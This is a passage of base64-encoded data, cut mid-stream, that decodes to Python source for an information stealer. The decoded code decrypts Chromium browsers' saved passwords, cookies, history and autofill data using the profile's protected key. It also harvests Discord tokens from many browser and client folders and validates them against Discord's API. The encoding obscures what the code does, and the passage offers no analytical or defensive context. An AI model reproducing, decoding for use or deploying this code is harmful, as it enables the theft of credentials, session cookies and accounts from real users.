xsPVRydWUsIGNhcHR1cmVfb3V0cHV0PVRydWUpCgogICAgY2xhc3MgQnJvd3NlcnM6CgogICAgICAgIGNsYXNzIENocm9taXVtOgogICAgICAgICAgICBCcm93c2VyUGF0aDogc3RyID0gTm9uZQogICAgICAgICAgICBFbmNyeXB0aW9uS2V5OiBieXRlcyA9IE5vbmUKCiAgICAgICAgICAgIGRlZiBfX2luaXRfXyhzZWxmLCBicm93c2VyUGF0aDogc3RyKSAtPiBOb25lOgogICAgICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguaXNkaXIoYnJvd3NlclBhdGgpOgogICAgICAgICAgICAgICAgICAgIHJhaXNlIE5vdEFEaXJlY3RvcnlFcnJvcignQnJvd3NlciBwYXRoIG5vdCBmb3VuZCEnKQogICAgICAgICAgICAgICAgc2VsZi5Ccm93c2VyUGF0aCA9IGJyb3dzZXJQYXRoCgogICAgICAgICAgICBkZWYgR2V0RW5jcnlwdGlvbktleShzZWxmKSAtPiBieXRlcyB8IE5vbmU6CiAgICAgICAgICAgICAgICBpZiBzZWxmLkVuY3J5cHRpb25LZXkgaXMgbm90IE5vbmU6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHNlbGYuRW5jcnlwdGlvbktleQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBsb2NhbFN0YXRlUGF0aCA9IG9zLnBhdGguam9pbigKICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5Ccm93c2VyUGF0aCwgJ0xvY2FsIFN0YXRlJykKICAgICAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmlzZmlsZShsb2NhbFN0YXRlUGF0aCk6CiAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3Blbihsb2NhbFN0YXRlUGF0aCwgZW5jb2Rpbmc9J3V0Zi04JywgZXJyb3JzPSdpZ25vcmUnKSBhcyBmaWxlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAganNvbkNvbnRlbnQ6IGRpY3QgPSBqc29uLmxvYWQoZmlsZSkKICAgICAgICAgICAgICAgICAgICAgICAgZW5jcnlwdGVkS2V5OiBzdHIgPSBqc29uQ29udGVudFsnb3NfY3J5cHQnXVsnZW5jcnlwdGVkX2tleSddCiAgICAgICAgICAgICAgICAgICAgICAgIGVuY3J5cHRlZEtleSA9IGJhc2U2NC5iNjRkZWNvZGUoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmNyeXB0ZWRLZXkuZW5jb2RlKCkpWzU6XQogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLkVuY3J5cHRpb25LZXkgPSBTeXNjYWxscy5DcnlwdFVucHJvdGVjdERhdGEoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmNyeXB0ZWRLZXkpCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBzZWxmLkVuY3J5cHRpb25LZXkKICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gTm9uZQoKICAgICAgICAgICAgZGVmIERlY3J5cHQoc2VsZiwgYnVmZmVyOiBieXRlcywga2V5OiBieXRlcykgLT4gc3RyOgogICAgICAgICAgICAgICAgdmVyc2lvbiA9IGJ1ZmZlci5kZWNvZGUoZXJyb3JzPSdpZ25vcmUnKQogICAgICAgICAgICAgICAgaWYgdmVyc2lvbi5zdGFydHN3aXRoKCgndjEwJywgJ3YxMScpKToKICAgICAgICAgICAgICAgICAgICBpdiA9IGJ1ZmZlclszOjE1XQogICAgICAgICAgICAgICAgICAgIGNpcGhlclRleHQgPSBidWZmZXJbMTU6XQogICAgICAgICAgICAgICAgICAgIHJldHVybiBweWFlcy5BRVNNb2RlT2ZPcGVyYXRpb25HQ00oa2V5LCBpdikuZGVjcnlwdChjaXBoZXJUZXh0KVs6LTE2XS5kZWNvZGUoZXJyb3JzPSdpZ25vcmUnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICByZXR1cm4gc3RyKFN5c2NhbGxzLkNyeXB0VW5wcm90ZWN0RGF0YShidWZmZXIpKQoKICAgICAgICAgICAgZGVmIEdldFBhc3N3b3JkcyhzZWxmKSAtPiBsaXN0W3R1cGxlW3N0ciwgc3RyLCBzdHJdXToKICAgICAgICAgICAgICAgIGVuY3J5cHRpb25LZXkgPSBzZWxmLkdldEVuY3J5cHRpb25LZXkoKQogICAgICAgICAgICAgICAgcGFzc3dvcmRzID0gbGlzdCgpCiAgICAgICAgICAgICAgICBpZiBlbmNyeXB0aW9uS2V5IGlzIE5vbmU6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHBhc3N3b3JkcwogICAgICAgICAgICAgICAgbG9naW5GaWxlUGF0aHMgPSBsaXN0KCkKICAgICAgICAgICAgICAgIGZvciByb290LCBfLCBmaWxlcyBpbiBvcy53YWxrKHNlbGYuQnJvd3NlclBhdGgpOgogICAgICAgICAgICAgICAgICAgIGZvciBmaWxlIGluIGZpbGVzOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBmaWxlLmxvd2VyKCkgPT0gJ2xvZ2luIGRhdGEnOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZXBhdGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZ2luRmlsZVBhdGhzLmFwcGVuZChmaWxlcGF0aCkKICAgICAgICAgICAgICAgIGZvciBwYXRoIGluIGxvZ2luRmlsZVBhdGhzOgogICAgICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBmaWxlID0gb3MucGF0aC5qb2luKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MuZ2V0ZW52KCd0ZW1wJyksIFV0aWxpdHkuR2V0UmFuZG9tU3RyaW5nKDEwKSArICcudG1wJykKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKHRlbXBmaWxlKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBzaHV0aWwuY29weShwYXRoLCB0ZW1wZmlsZSkKICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgIGRiID0gc3FsaXRlMy5jb25uZWN0KHRlbXBmaWxlKQogICAgICAgICAgICAgICAgICAgIGRiLnRleHRfZmFjdG9yeSA9IGxhbWJkYSBiOiBiLmRlY29kZShlcnJvcnM9J2lnbm9yZScpCiAgICAgICAgICAgICAgICAgICAgY3Vyc29yID0gZGIuY3Vyc29yKCkKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHJlc3VsdHMgPSBjdXJzb3IuZXhlY3V0ZSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdTRUxFQ1Qgb3JpZ2luX3VybCwgdXNlcm5hbWVfdmFsdWUsIHBhc3N3b3JkX3ZhbHVlIEZST00gbG9naW5zJykuZmV0Y2hhbGwoKQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgdXJsLCB1c2VybmFtZSwgcGFzc3dvcmQgaW4gcmVzdWx0czoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3N3b3JkID0gc2VsZi5EZWNyeXB0KHBhc3N3b3JkLCBlbmNyeXB0aW9uS2V5KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdXJsIGFuZCB1c2VybmFtZSBhbmQgcGFzc3dvcmQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzc3dvcmRzLmFwcGVuZCgodXJsLCB1c2VybmFtZSwgcGFzc3dvcmQpKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICBjdXJzb3IuY2xvc2UoKQogICAgICAgICAgICAgICAgICAgIGRiLmNsb3NlKCkKICAgICAgICAgICAgICAgICAgICBvcy5yZW1vdmUodGVtcGZpbGUpCiAgICAgICAgICAgICAgICByZXR1cm4gcGFzc3dvcmRzCgogICAgICAgICAgICBkZWYgR2V0Q29va2llcyhzZWxmKSAtPiBsaXN0W3R1cGxlW3N0ciwgc3RyLCBzdHIsIHN0ciwgaW50XV06CiAgICAgICAgICAgICAgICBlbmNyeXB0aW9uS2V5ID0gc2VsZi5HZXRFbmNyeXB0aW9uS2V5KCkKICAgICAgICAgICAgICAgIGNvb2tpZXMgPSBsaXN0KCkKICAgICAgICAgICAgICAgIGlmIGVuY3J5cHRpb25LZXkgaXMgTm9uZToKICAgICAgICAgICAgICAgICAgICByZXR1cm4gY29va2llcwogICAgICAgICAgICAgICAgY29va2llc0ZpbGVQYXRocyA9IGxpc3QoKQogICAgICAgICAgICAgICAgZm9yIHJvb3QsIF8sIGZpbGVzIGluIG9zLndhbGsoc2VsZi5Ccm93c2VyUGF0aCk6CiAgICAgICAgICAgICAgICAgICAgZm9yIGZpbGUgaW4gZmlsZXM6CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGZpbGUubG93ZXIoKSA9PSAnY29va2llcyc6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWxlcGF0aCA9IG9zLnBhdGguam9pbihyb290LCBmaWxlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29va2llc0ZpbGVQYXRocy5hcHBlbmQoZmlsZXBhdGgpCiAgICAgICAgICAgICAgICBmb3IgcGF0aCBpbiBjb29raWVzRmlsZVBhdGhzOgogICAgICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICAgICAgICAgIHRlbXBmaWxlID0gb3MucGF0aC5qb2luKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgb3MuZ2V0ZW52KCd0ZW1wJyksIFV0aWxpdHkuR2V0UmFuZG9tU3RyaW5nKDEwKSArICcudG1wJykKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguaXNmaWxlKHRlbXBmaWxlKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBzaHV0aWwuY29weShwYXRoLCB0ZW1wZmlsZSkKICAgICAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgIGRiID0gc3FsaXRlMy5jb25uZWN0KHRlbXBmaWxlKQogICAgICAgICAgICAgICAgICAgIGRiLnRleHRfZmFjdG9yeSA9IGxhbWJkYSBiOiBiLmRlY29kZShlcnJvcnM9J2lnbm9yZScpCiAgICAgICAgICAgICAgICAgICAgY3Vyc29yID0gZGIuY3Vyc29yKCkKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHJlc3VsdHMgPSBjdXJzb3IuZXhlY3V0ZSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICdTRUxFQ1QgaG9zdF9rZXksIG5hbWUsIHBhdGgsIGVuY3J5cHRlZF92YWx1ZSwgZXhwaXJlc191dGMgRlJPTSBjb29raWVzJykuZmV0Y2hhbGwoKQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgaG9zdCwgbmFtZSwgcGF0aCwgY29va2llLCBleHBpcnkgaW4gcmVzdWx0czoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvb2tpZSA9IHNlbGYuRGVjcnlwdChjb29raWUsIGVuY3J5cHRpb25LZXkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBob3N0IGFuZCBuYW1lIGFuZCBjb29raWU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29va2llcy5hcHBlbmQoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIChob3N0LCBuYW1lLCBwYXRoLCBjb29raWUsIGV4cGlyeSkpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgICAgIGN1cnNvci5jbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgZGIuY2xvc2UoKQogICAgICAgICAgICAgICAgICAgIG9zLnJlbW92ZSh0ZW1wZmlsZSkKICAgICAgICAgICAgICAgIHJldHVybiBjb29raWVzCgogICAgICAgICAgICBkZWYgR2V0SGlzdG9yeShzZWxmKSAtPiBsaXN0W3R1cGxlW3N0ciwgc3RyLCBpbnRdXToKICAgICAgICAgICAgICAgIGhpc3RvcnkgPSBsaXN0KCkKICAgICAgICAgICAgICAgIGhpc3RvcnlGaWxlUGF0aHMgPSBsaXN0KCkKICAgICAgICAgICAgICAgIGZvciByb290LCBfLCBmaWxlcyBpbiBvcy53YWxrKHNlbGYuQnJvd3NlclBhdGgpOgogICAgICAgICAgICAgICAgICAgIGZvciBmaWxlIGluIGZpbGVzOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBmaWxlLmxvd2VyKCkgPT0gJ2hpc3RvcnknOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZXBhdGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhpc3RvcnlGaWxlUGF0aHMuYXBwZW5kKGZpbGVwYXRoKQogICAgICAgICAgICAgICAgZm9yIHBhdGggaW4gaGlzdG9yeUZpbGVQYXRoczoKICAgICAgICAgICAgICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgICAgICAgICB0ZW1wZmlsZSA9IG9zLnBhdGguam9pbigKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLmdldGVudigndGVtcCcpLCBVdGlsaXR5LkdldFJhbmRvbVN0cmluZygxMCkgKyAnLnRtcCcpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZSh0ZW1wZmlsZSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgc2h1dGlsLmNvcHkocGF0aCwgdGVtcGZpbGUpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICBkYiA9IHNxbGl0ZTMuY29ubmVjdCh0ZW1wZmlsZSkKICAgICAgICAgICAgICAgICAgICBkYi50ZXh0X2ZhY3RvcnkgPSBsYW1iZGEgYjogYi5kZWNvZGUoZXJyb3JzPSdpZ25vcmUnKQogICAgICAgICAgICAgICAgICAgIGN1cnNvciA9IGRiLmN1cnNvcigpCiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICByZXN1bHRzID0gY3Vyc29yLmV4ZWN1dGUoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnU0VMRUNUIHVybCwgdGl0bGUsIHZpc2l0X2NvdW50LCBsYXN0X3Zpc2l0X3RpbWUgRlJPTSB1cmxzJykuZmV0Y2hhbGwoKQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgdXJsLCB0aXRsZSwgdmMsIGx2dCBpbiByZXN1bHRzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgdXJsIGFuZCB0aXRsZSBhbmQgKHZjIGlzIG5vdCBOb25lKSBhbmQgKGx2dCBpcyBub3QgTm9uZSk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaGlzdG9yeS5hcHBlbmQoKHVybCwgdGl0bGUsIHZjLCBsdnQpKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICBjdXJzb3IuY2xvc2UoKQogICAgICAgICAgICAgICAgICAgIGRiLmNsb3NlKCkKICAgICAgICAgICAgICAgICAgICBvcy5yZW1vdmUodGVtcGZpbGUpCiAgICAgICAgICAgICAgICBoaXN0b3J5LnNvcnQoa2V5PWxhbWJkYSB4OiB4WzNdLCByZXZlcnNlPVRydWUpCiAgICAgICAgICAgICAgICByZXR1cm4gbGlzdChbKHhbMF0sIHhbMV0sIHhbMl0pIGZvciB4IGluIGhpc3RvcnldKQoKICAgICAgICAgICAgZGVmIEdldEF1dG9maWxscyhzZWxmKSAtPiBsaXN0W3N0cl06CiAgICAgICAgICAgICAgICBhdXRvZmlsbHMgPSBsaXN0KCkKICAgICAgICAgICAgICAgIGF1dG9maWxsc0ZpbGVQYXRocyA9IGxpc3QoKQogICAgICAgICAgICAgICAgZm9yIHJvb3QsIF8sIGZpbGVzIGluIG9zLndhbGsoc2VsZi5Ccm93c2VyUGF0aCk6CiAgICAgICAgICAgICAgICAgICAgZm9yIGZpbGUgaW4gZmlsZXM6CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGZpbGUubG93ZXIoKSA9PSAnd2ViIGRhdGEnOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZmlsZXBhdGggPSBvcy5wYXRoLmpvaW4ocm9vdCwgZmlsZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF1dG9maWxsc0ZpbGVQYXRocy5hcHBlbmQoZmlsZXBhdGgpCiAgICAgICAgICAgICAgICBmb3IgcGF0aCBpbiBhdXRvZmlsbHNGaWxlUGF0aHM6CiAgICAgICAgICAgICAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgICAgICAgICAgICAgdGVtcGZpbGUgPSBvcy5wYXRoLmpvaW4oCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcy5nZXRlbnYoJ3RlbXAnKSwgVXRpbGl0eS5HZXRSYW5kb21TdHJpbmcoMTApICsgJy50bXAnKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5pc2ZpbGUodGVtcGZpbGUpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHNodXRpbC5jb3B5KHBhdGgsIHRlbXBmaWxlKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgZGIgPSBzcWxpdGUzLmNvbm5lY3QodGVtcGZpbGUpCiAgICAgICAgICAgICAgICAgICAgZGIudGV4dF9mYWN0b3J5ID0gbGFtYmRhIGI6IGIuZGVjb2RlKGVycm9ycz0naWdub3JlJykKICAgICAgICAgICAgICAgICAgICBjdXJzb3IgPSBkYi5jdXJzb3IoKQogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgcmVzdWx0czogbGlzdFtzdHJdID0gW3hbMF0gZm9yIHggaW4gY3Vyc29yLmV4ZWN1dGUoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnU0VMRUNUIHZhbHVlIEZST00gYXV0b2ZpbGwnKS5mZXRjaGFsbCgpXQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgZGF0YSBpbiByZXN1bHRzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YSA9IGRhdGEuc3RyaXAoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZGF0YSBhbmQgKG5vdCBkYXRhIGluIGF1dG9maWxscyk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXV0b2ZpbGxzLmFwcGVuZChkYXRhKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICBjdXJzb3IuY2xvc2UoKQogICAgICAgICAgICAgICAgICAgIGRiLmNsb3NlKCkKICAgICAgICAgICAgICAgICAgICBvcy5yZW1vdmUodGVtcGZpbGUpCiAgICAgICAgICAgICAgICByZXR1cm4gYXV0b2ZpbGxzCgogICAgY2xhc3MgRGlzY29yZDoKICAgICAgICBodHRwQ2xpZW50ID0gUG9vbE1hbmFnZXIoY2VydF9yZXFzPSdDRVJUX05PTkUnKQogICAgICAgIFJPQU1JTkcgPSBvcy5nZXRlbnYoJ2FwcGRhdGEnKQogICAgICAgIExPQ0FMQVBQREFUQSA9IG9zLmdldGVudignbG9jYWxhcHBkYXRhJykKICAgICAgICBSRUdFWCA9ICdbXFx3LV17MjQsMjZ9XFwuW1xcdy1dezZ9XFwuW1xcdy1dezI1LDExMH0nCiAgICAgICAgUkVHRVhfRU5DID0gJ2RRdzR3OVdnWGNROlteLipcXFtcJyguKilcJ1xcXS4qJF1bXlxcIl0qJwoKICAgICAgICBAc3RhdGljbWV0aG9kCiAgICAgICAgZGVmIEdldEhlYWRlcnModG9rZW46IHN0ciA9IE5vbmUpIC0+IGRpY3Q6CiAgICAgICAgICAgIGhlYWRlcnMgPSB7J2NvbnRlbnQtdHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJywKICAgICAgICAgICAgICAgICAgICAgICAndXNlci1hZ2VudCc6ICdNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMF8xNSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkzLjAuNDU5My4xMjIgU2FmYXJpLzUzNy4zNid9CiAgICAgICAgICAgIGlmIHRva2VuOgogICAgICAgICAgICAgICAgaGVhZGVyc1snYXV0aG9yaXphdGlvbiddID0gdG9rZW4KICAgICAgICAgICAgcmV0dXJuIGhlYWRlcnMKCiAgICAgICAgQHN0YXRpY21ldGhvZAogICAgICAgIGRlZiBHZXRUb2tlbnMoKSAtPiBsaXN0W2RpY3RdOgogICAgICAgICAgICByZXN1bHRzOiBsaXN0W2RpY3RdID0gbGlzdCgpCiAgICAgICAgICAgIHRva2VuczogbGlzdFtzdHJdID0gbGlzdCgpCiAgICAgICAgICAgIHRocmVhZHM6IGxpc3RbVGhyZWFkXSA9IGxpc3QoKQogICAgICAgICAgICBwYXRocyA9IHsnRGlzY29yZCc6IG9zLnBhdGguam9pbihEaXNjb3JkLlJPQU1JTkcsICdkaXNjb3JkJyksICdEaXNjb3JkIENhbmFyeSc6IG9zLnBhdGguam9pbihEaXNjb3JkLlJPQU1JTkcsICdkaXNjb3JkY2FuYXJ5JyksICdMaWdodGNvcmQnOiBvcy5wYXRoLmpvaW4oRGlzY29yZC5ST0FNSU5HLCAnTGlnaHRjb3JkJyksICdEaXNjb3JkIFBUQic6IG9zLnBhdGguam9pbihEaXNjb3JkLlJPQU1JTkcsICdkaXNjb3JkcHRiJyksICdPcGVyYSc6IG9zLnBhdGguam9pbihEaXNjb3JkLlJPQU1JTkcsICdPcGVyYSBTb2Z0d2FyZScsICdPcGVyYSBTdGFibGUnKSwgJ09wZXJhIEdYJzogb3MucGF0aC5qb2luKERpc2NvcmQuUk9BTUlORywgJ09wZXJhIFNvZnR3YXJlJywgJ09wZXJhIEdYIFN0YWJsZScpLCAnQW1pZ28nOiBvcy5wYXRoLmpvaW4oRGlzY29yZC5MT0NBTEFQUERBVEEsICdBbWlnbycsICdVc2VyIERhdGEnKSwgJ1RvcmNoJzogb3MucGF0aC5qb2luKERpc2NvcmQuTE9DQUxBUFBEQVRBLCAnVG9yY2gnLCAnVXNlciBEYXRhJyksICdLb21ldGEnOiBvcy5wYXRoLmpvaW4oRGlzY29yZC5MT0NBTEFQUERBVEEsICdLb21ldGEnLCAnVXNlciBEYXRhJyksICdPcmJpdHVtJzogb3MucGF0aC5qb2luKERpc2NvcmQuTE9DQUxBUFBEQVRBLCAnT3JiaXR1bScsICdVc2VyIERhdGEnKSwgJ0NlbnRCcm93c2UnOiBvcy5wYXRoLmpvaW4oRGlzY29yZC5MT0NBTEFQUERBVEEsICdDZW50QnJvd3NlcicsICdVc2VyIERhdGEnKSwgJzdTdGEnOiBvcy5wYXRoLmpvaW4oRGlzY29yZC5MT0NBTEFQUERBVEEsICc3U3RhcicsICc3U3RhcicsICdVc2VyIERhdGEnKSwgJ1NwdXRuaWsnOiBvcy5wYXRoLmpvaW4oCiAgICAgICAgICAgICAgICBEaXNjb3JkLkxPQ0FMQVBQREFUQSwgJ1NwdXRuaWsnLCAnU3B1dG5paycsICdVc2VyIERhdGEnKSwgJ1ZpdmFsZGknOiBvcy5wYXRoLmpvaW4oRGlzY29yZC5MT0NBTEFQUERBVEEsICdWaXZhbGRpJywgJ1VzZXIgRGF0YScpLCAnQ2hyb21lIFN4Uyc6IG9zLnBhdGguam9pbihEaXNjb3JkLkxPQ0FMQVBQREFUQSwgJ0dvb2dsZScsICdDaHJvbWUgU3hTJywgJ1VzZXIgRGF0YScpLCAnQ2hyb21lJzogb3MucGF0aC5qb2luKERpc2NvcmQuTE9DQUxBUFBEQVRBLCAnR29vZ2xlJywgJ0Nocm9tZScsICdVc2VyIERhdGEnKSwgJ0ZpcmVGb3gnOiBvcy5wYXRoLmpvaW4oRGlzY29yZC5ST0FNSU5HLCAnTW96aWxsYScsICdGaXJlZm94JywgJ1Byb2ZpbGVzJyksICdFcGljIFByaXZhY3kgQnJvd3NlJzogb3MucGF0aC5qb2luKERpc2NvcmQuTE9DQUxBUFBEQVRBLCAnRXBpYyBQcml2YWN5IEJyb3dzZXInLCAnVXNlciBEYXRhJyksICdNaWNyb3NvZnQgRWRnZSc6IG9zLnBhdGguam9pbihEaXNjb3JkLkxPQ0FMQVBQREFUQSwgJ01pY3Jvc29mdCcsICdFZGdlJywgJ1VzZXIgRGF0YScpLCAnVXJhbic6IG9zLnBhdGguam9pbihEaXNjb3JkLkxPQ0FMQVBQREFUQSwgJ3VDb3pNZWRpYScsICdVcmFuJywgJ1VzZXIgRGF0YScpLCAnWWFuZGV4Jzogb3MucGF0aC5qb2luKERpc2NvcmQuTE9DQUxBUFBEQVRBLCAnWWFuZGV4JywgJ1lhbmRleEJyb3dzZXInLCAnVXNlciBEYXRhJyksICdCcmF2ZSc6IG9zLnBhdGguam9pbihEaXNjb3JkLkxPQ0FMQVBQREFUQSwgJ0JyYXZlU29mdHdhcmUnLCAnQnJhdmUtQnJvd3NlcicsICdVc2VyIERhdGEnKSwgJ0lyaWRpdW0nOiBvcy5wYXRoLmpvaW4oRGlzY29yZC5MT0NBTEFQUERBVEEsICdJcmlkaXVtJywgJ1VzZXIgRGF0YScpfQogICAgICAgICAgICBmb3IgbmFtZSwgcGF0aCBpbiBwYXRocy5pdGVtcygpOgogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5pc2RpcihwYXRoKToKICAgICAgICAgICAgICAgICAgICBpZiBuYW1lID09ICdGaXJlRm94JzoKICAgICAgICAgICAgICAgICAgICAgICAgdCA9IFRocmVhZCh0YXJnZXQ9bGFtYmRhOiB0b2tlbnMuZXh0ZW5kKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgRGlzY29yZC5GaXJlRm94U3RlYWwocGF0aCkgb3IgbGlzdCgpKSkKICAgICAgICAgICAgICAgICAgICAgICAgdC5zdGFydCgpCiAgICAgICAgICAgICAgICAgICAgICAgIHRocmVhZHMuYXBwZW5kKHQpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgdCA9IFRocmVhZCh0YXJnZXQ9bGFtYmRhOiB0b2tlbnMuZXh0ZW5kKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgRGlzY29yZC5TYWZlU3RvcmFnZVN0ZWFsKHBhdGgpIG9yIGxpc3QoKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIHQuc3RhcnQoKQogICAgICAgICAgICAgICAgICAgICAgICB0aHJlYWRzLmFwcGVuZCh0KQogICAgICAgICAgICAgICAgICAgICAgICB0ID0gVGhyZWFkKHRhcmdldD1sYW1iZGE6IHRva2Vucy5leHRlbmQoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBEaXNjb3JkLlNpbXBsZVN0ZWFsKHBhdGgpIG9yIGxpc3QoKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIHQuc3RhcnQoKQogICAgICAgICAgICAgICAgICAgICAgICB0aHJlYWRzLmFwcGVuZCh0KQogICAgICAgICAgICBmb3IgdGhyZWFkIGluIHRocmVhZHM6CiAgICAgICAgICAgICAgICB0aHJlYWQuam9pbigpCiAgICAgICAgICAgIHRva2VucyA9IFsqc2V0KHRva2VucyldCiAgICAgICAgICAgIGZvciB0b2tlbiBpbiB0b2tlbnM6CiAgICAgICAgICAgICAgICByOiBIVFRQUmVzcG9uc2UgPSBEaXNjb3JkLmh0dHBDbGllbnQucmVxdWVzdCgKICAgICAgICAgICAgICAgICAgICAnR0VUJywgJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZScsIGhlYWRlcnM9RGlzY29yZC5HZXRIZWFkZXJzKHRva2VuLnN0cmlwKCkpKQogICAgICAgICAgICAgICAgaWYgci5zdGF0dXMgPT0gMjAwOgogICAgICAgICAgICAgICAgICAgIHIgPSByLmRhdGEuZGVjb2RlKGVycm9ycz0naWdub3JlJykKICAgICAgICAgICAgICAgICAgICByID0ganNvbi5sb2FkcyhyKQogICAgICAgICAgICAgICAgICAgIHVzZXIgPSByWyd1c2VybmFtZSddI